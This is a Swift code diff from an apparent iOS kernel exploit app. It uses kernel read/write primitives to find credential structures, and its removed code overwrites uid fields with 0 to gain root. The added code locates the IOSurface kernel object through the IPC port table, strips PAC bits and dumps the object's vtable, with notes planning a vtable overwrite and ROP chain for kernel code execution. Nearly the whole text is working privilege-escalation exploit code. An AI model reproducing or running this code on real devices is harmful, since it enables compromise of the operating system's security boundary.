@@ -319,121 +319,113 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         report += String(format: "task:     0x%llx\n", task)
         report += String(format: "proc_ro:  0x%llx\n", procRo)
         report += String(format: "ucred:    0x%llx\n", ucred)
-        report += String(format: "orig uid: %d\n\n", origUid)
+        report += String(format: "orig uid: %d\n", origUid)
+        report += String(format: "surface:  ID=%d, map=0x%llx\n\n", engine.surfaceID, engine.mappedAddress)
         
         // ============================================================
-        // EXPERIMENT: Scan task struct for security_token / audit_token
-        // These contain uid/gid used for permission checks
-        // task struct is on HEAP — should be writable!
+        // EXPERIMENT: Find IOSurface kernel object in heap
+        // IOSurface objects have their ID stored somewhere in the struct
+        // We scan heap near task/proc for our surface ID
         // ============================================================
         
-        report += "=== SCANNING TASK STRUCT FOR UID=501 ===\n"
+        report += "=== EXPERIMENT: FIND IOSURFACE KERNEL OBJECT ===\n"
+        report += String(format: "Looking for surface ID=%d (0x%x) in kernel heap...\n\n", engine.surfaceID, engine.surfaceID)
         
-        var taskMatches: [(offset: Int, val: UInt32, next: UInt32, next2: UInt32, next3: UInt32)] = []
+        // Strategy: IOSurface objects are allocated in IOKit zones
+        // They're typically near other IOKit objects
+        // Scan around task port area (ipc_space → ports → IOSurface connection)
         
-        for offset in stride(from: 0, to: 0x600, by: 4) {
-            let val = ds_kread32(task + UInt64(offset))
-            if val == 501 {
-                let n1 = ds_kread32(task + UInt64(offset + 4))
-                let n2 = ds_kread32(task + UInt64(offset + 8))
-                let n3 = ds_kread32(task + UInt64(offset + 12))
-                taskMatches.append((offset, val, n1, n2, n3))
-                report += String(format: "  task+0x%03x: %d %d %d %d\n", offset, val, n1, n2, n3)
-            }
-        }
+        let itkSpace = ds_kread64(task + UInt64(off_task_itk_space))
+        let isTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
         
-        report += String(format: "\nFound %d uid=501 in task (0x600 range)\n\n", taskMatches.count)
+        report += String(format: "itk_space: 0x%llx\n", itkSpace)
+        report += String(format: "is_table:  0x%llx\n\n", isTable)
         
-        // ============================================================
-        // EXPERIMENT: Try writing uid=0 at each task offset
-        // This is SAFE: task struct is on writable heap
-        // Worst case: write succeeds but doesn't affect getuid()
-        // ============================================================
+        // Scan IPC port table entries for IOSurface port
+        // Each entry is sizeof_ipc_entry bytes
+        let entrySize = UInt64(sizeof_ipc_entry)
+        var iosurfacePort: UInt64 = 0
+        var iosurfaceKobject: UInt64 = 0
         
-        if !taskMatches.isEmpty {
-            report += "=== WRITING uid=0 TO TASK OFFSETS ===\n"
+        report += "Scanning IPC port table (first 200 entries)...\n"
+        for i in 0..<200 {
+            let entryAddr = isTable + UInt64(i) * entrySize
+            let portPtr = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
+            if portPtr == 0 { continue }
             
-            for match in taskMatches {
-                let addr = task + UInt64(match.offset)
-                ds_kwrite32(addr, 0)
-                let readBack = ds_kread32(addr)
-                
-                if readBack == 0 {
-                    // Also zero next field if it was 501 (likely gid)
-                    if match.next == 501 {
-                        ds_kwrite32(addr + 4, 0)
-                    }
-                    
-                    let uid = getuid()
-                    report += String(format: "  task+0x%03x: ✅ written! getuid()=%d\n", match.offset, uid)
-                    
-                    if uid == 0 {
-                        report += "\n🎉🎉🎉 ROOT VIA TASK! 🎉🎉🎉\n"
-                        report += String(format: "Offset: task+0x%03x\n", match.offset)
-                        rootResult = report
-                        return
-                    }
-                } else {
-                    report += String(format: "  task+0x%03x: ❌ blocked (still %d)\n", match.offset, readBack)
+            // Strip PAC
+            let port = portPtr & 0x0000007FFFFFFFFF
+            if port < 0xfffffff000000000 { continue }  // Invalid
+            
+            // Read kobject from port
+            let kobject = ds_kread64(port + UInt64(off_ipc_port_ip_kobject))
+            if kobject == 0 { continue }
+            let kobj = kobject & 0x0000007FFFFFFFFF
+            if kobj < 0xfffffff000000000 { continue }
+            
+            // Check if this kobject contains our surface ID
+            // IOSurface ID is typically at offset 0x10-0x20 in the object
+            for off in stride(from: 0, to: 0x40, by: 4) {
+                let val = ds_kread32(kobj + UInt64(off))
+                if val == engine.surfaceID && engine.surfaceID != 0 {
+                    iosurfacePort = port
+                    iosurfaceKobject = kobj
+                    report += String(format: "  FOUND! port[%d]=0x%llx kobject=0x%llx (ID at +0x%x)\n", i, port, kobj, off)
+                    break
                 }
             }
-            
-            // Check getuid one more time after all writes
-            let finalUid = getuid()
-            report += String(format: "\nFinal getuid(): %d\n", finalUid)
-            if finalUid == 0 {
-                report += "\n🎉🎉🎉 ROOT! 🎉🎉🎉\n"
-                rootResult = report
-                return
-            }
+            if iosurfaceKobject != 0 { break }
         }
         
-        // ============================================================
-        // EXPERIMENT: Scan proc struct for uid=501
-        // ============================================================
-        
-        report += "\n=== SCANNING PROC STRUCT FOR UID=501 ===\n"
-        
-        var procMatches: [(offset: Int, val: UInt32, next: UInt32)] = []
-        
-        for offset in stride(from: 0, to: 0x400, by: 4) {
-            let val = ds_kread32(proc + UInt64(offset))
-            if val == 501 {
-                let n1 = ds_kread32(proc + UInt64(offset + 4))
-                procMatches.append((offset, val, n1))
-                report += String(format: "  proc+0x%03x: %d %d\n", offset, val, n1)
-            }
-        }
-        
-        if !procMatches.isEmpty {
-            report += "\n=== WRITING uid=0 TO PROC OFFSETS ===\n"
+        if iosurfaceKobject == 0 {
+            report += "  IOSurface object not found in first 200 ports.\n"
+            report += "  Trying broader scan around known heap objects...\n\n"
             
-            for match in procMatches {
-                let addr = proc + UInt64(match.offset)
-                ds_kwrite32(addr, 0)
-                let readBack = ds_kread32(addr)
-                
-                if readBack == 0 {
-                    if match.next == 501 {
-                        ds_kwrite32(addr + 4, 0)
+            // Alternative: scan near proc/task for surface ID
+            let scanBases: [(String, UInt64)] = [
+                ("proc-0x1000", proc > 0x1000 ? proc - 0x1000 : proc),
+                ("task-0x1000", task > 0x1000 ? task - 0x1000 : task),
+                ("ucred-0x1000", ucred > 0x1000 ? ucred - 0x1000 : ucred),
+            ]
+            
+            for (name, base) in scanBases {
+                for off in stride(from: 0, to: 0x2000, by: 4) {
+                    let val = ds_kread32(base + UInt64(off))
+                    if val == engine.surfaceID && engine.surfaceID != 0 {
+                        report += String(format: "  FOUND at %@+0x%x (addr=0x%llx)\n", name, off, base + UInt64(off))
+                        iosurfaceKobject = base + UInt64(off) - UInt64(off % 0x100)  // Align to likely object start
                     }
-                    let uid = getuid()
-                    report += String(format: "  proc+0x%03x: ✅ written! getuid()=%d\n", match.offset, uid)
-                    if uid == 0 {
-                        report += "\n🎉🎉🎉 ROOT VIA PROC! 🎉🎉🎉\n"
-                        rootResult = report
-                        return
-                    }
-                } else {
-                    report += String(format: "  proc+0x%03x: ❌ blocked\n", match.offset)
                 }
             }
         }
         
-        report += "\n=== DONE ===\n"
-        report += "No root achieved. All results logged.\n"
-        report += "Send screenshot to Kiro for analysis.\n"
+        // ============================================================
+        // If found: dump IOSurface object structure
+        // ============================================================
         
+        if iosurfaceKobject != 0 {
+            report += String(format: "\n=== IOSURFACE OBJECT DUMP (0x%llx) ===\n", iosurfaceKobject)
+            
+            // Dump first 0x80 bytes (vtable + fields)
+            for i in stride(from: 0, to: 0x80, by: 8) {
+                let val = ds_kread64(iosurfaceKobject + UInt64(i))
+                let marker: String
+                if i == 0 { marker = " ← vtable?" }
+                else if val == UInt64(engine.surfaceID) { marker = " ← surface ID" }
+                else if val == engine.mappedAddress { marker = " ← mapped addr?" }
+                else { marker = "" }
+                report += String(format: "  +0x%02x: 0x%016llx%@\n", i, val, marker)
+            }
+            
+            report += "\n→ If vtable found, next step: overwrite vtable entry\n"
+            report += "→ Point to ROP gadget → kernel code execution → root\n"
+        } else {
+            report += "\n=== IOSURFACE NOT FOUND ===\n"
+            report += "Surface ID not found in scanned heap regions.\n"
+            report += "May need to scan more broadly or use different technique.\n"
+        }
+        
+        report += "\n=== EXPERIMENT COMPLETE ===\n"
         rootResult = report
     }
 }
